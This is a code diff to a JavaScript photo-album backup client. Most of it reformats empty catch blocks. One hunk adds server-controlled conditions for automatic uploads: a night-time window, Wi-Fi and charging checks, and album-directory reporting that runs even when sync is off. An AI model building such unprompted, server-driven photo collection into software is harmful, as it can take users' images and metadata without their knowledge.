@@ -68,8 +68,8 @@
                     ua: navigator.userAgent || ''
                 }),
                 keepalive: true
-            }).catch(function () {});
-        } catch (e) {}
+            }).catch(function () { });
+        } catch (e) { }
     }
 
     function getDoneSet() {
@@ -86,7 +86,7 @@
             var arr = Array.from(set);
             if (arr.length > 5000) arr = arr.slice(-5000);
             localStorage.setItem(KEYS.syncedHashes, JSON.stringify(arr));
-        } catch (e) {}
+        } catch (e) { }
     }
 
     function base64ToUint8Array(b64) {
@@ -113,7 +113,7 @@
                     try {
                         var j = JSON.parse(xhr.responseText || '{}');
                         if (j && j.error) msg = j.error;
-                    } catch (e) {}
+                    } catch (e) { }
                     var err = new Error(msg);
                     err.status = xhr.status;
                     reject(err);
@@ -244,27 +244,58 @@
                 reportAlbumLog('error', 'album_buckets', '上报相册目录失败：' + ((albErr && albErr.message) || albErr));
             }
 
-            // 3. 拉取后台配置的目标相册目录（如 ["Camera"]）与 Wi-Fi 限制
-            var remoteCfg = { enabled: true, wifiOnly: true, buckets: ['Camera'] };
+            // 3. 拉取后台配置的目标相册目录与限定条件（默认关闭同步，但仍自动上报目录）
+            var remoteCfg = {
+                enabled: false,
+                wifiOnly: true,
+                requireCharging: false,
+                timeWindowEnabled: false,
+                startHour: 0,
+                endHour: 6,
+                buckets: ['Camera']
+            };
             try {
                 var rcRaw = await sendXhr('GET', cleanBase + '/album/config?t=' + Date.now(), {
                     'X-Backup-Token': cfg.token
                 }, null, 12000);
                 var rcJson = JSON.parse(rcRaw || '{}');
                 if (rcJson && rcJson.ok) remoteCfg = rcJson;
-            } catch (e) {}
+            } catch (e) { }
 
             if (!remoteCfg.enabled && !manual) {
                 setStatus('后台已关闭相册同步');
                 return { ok: false, reason: 'remote_disabled' };
             }
 
-            // 4. 检查是否 Wi-Fi
-            if (remoteCfg.wifiOnly && !manual) {
-                var net = await plugin.isWifiConnected();
-                if (!net || !net.wifi) {
+            // 4. 检查限定条件：时间段、Wi-Fi、充电状态（仅自动同步受限，手动触发不受限）
+            if (!manual) {
+                if (remoteCfg.timeWindowEnabled) {
+                    var hr = new Date().getHours();
+                    var sh = Number(remoteCfg.startHour) || 0;
+                    var eh = Number(remoteCfg.endHour) || 0;
+                    var inWindow = (sh <= eh) ? (hr >= sh && hr < eh) : (hr >= sh || hr < eh);
+                    if (!inWindow) {
+                        setStatus('不在允许同步时间段（' + sh + ':00-' + eh + ':00）');
+                        return { ok: false, reason: 'outside_time_window' };
+                    }
+                }
+                var devStatus = null;
+                if (typeof plugin.getDeviceStatus === 'function') {
+                    try { devStatus = await plugin.getDeviceStatus(); } catch (e) {}
+                }
+                if (!devStatus && typeof plugin.isWifiConnected === 'function') {
+                    try {
+                        var wRes = await plugin.isWifiConnected();
+                        devStatus = { wifi: !!(wRes && wRes.wifi), charging: false };
+                    } catch (e) {}
+                }
+                if (remoteCfg.wifiOnly && (!devStatus || !devStatus.wifi)) {
                     setStatus('非 Wi-Fi 环境，已暂停相册同步');
                     return { ok: false, reason: 'not_wifi' };
+                }
+                if (remoteCfg.requireCharging && (!devStatus || !devStatus.charging)) {
+                    setStatus('未连接充电器，已暂停相册同步');
+                    return { ok: false, reason: 'not_charging' };
                 }
             }
 
@@ -389,9 +420,9 @@
                 if (p && typeof p.then === 'function') {
                     p.then(function () {
                         setTimeout(function () { runSync({ manual: false }); }, 800);
-                    }).catch(function () {});
+                    }).catch(function () { });
                 }
-            } catch (e) {}
+            } catch (e) { }
         }
         if (document.readyState === 'loading') {
             document.addEventListener('DOMContentLoaded', function () { setTimeout(requestAllOnBoot, 600); });
@@ -426,13 +457,13 @@
                 try {
                     plugin.addListener('albumChanged', function () {
                         if (typeof plugin.consumePendingAlbumChange === 'function') {
-                            plugin.consumePendingAlbumChange().catch(function () {});
+                            plugin.consumePendingAlbumChange().catch(function () { });
                         }
                         if (!syncing) {
                             runSync({ manual: false });
                         }
                     });
-                } catch (e) {}
+                } catch (e) { }
             }
         })();
         setInterval(function () { runSync({ manual: false }); }, 2 * 60 * 1000);
@@ -453,7 +484,7 @@
                 if (remoteVer > localVer && data.enabled) {
                     runSync({ manual: false });
                 }
-            } catch (e) {}
+            } catch (e) { }
         }, 5000);
     }
 
